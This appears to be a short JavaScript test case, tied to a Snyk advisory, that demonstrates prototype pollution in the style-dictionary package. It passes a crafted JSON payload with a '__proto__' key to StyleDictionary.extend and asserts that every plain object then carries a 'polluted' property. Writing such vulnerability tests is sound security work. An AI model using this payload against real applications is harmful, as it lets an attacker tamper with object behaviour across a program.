//https://snyk.io/vuln/SNYK-JS-STYLEDICTIONARY-1080632
test("prototype pollution in style-dictionary", () => {
  const StyleDictionary = require("style-dictionary");
  const obj = {};
  let opts = JSON.parse('{"__proto__":{"polluted":"yes"}}');

  expect({}.polluted).toBe(undefined);

  StyleDictionary.extend(opts);
  expect({}.polluted).toBe("yes");
});
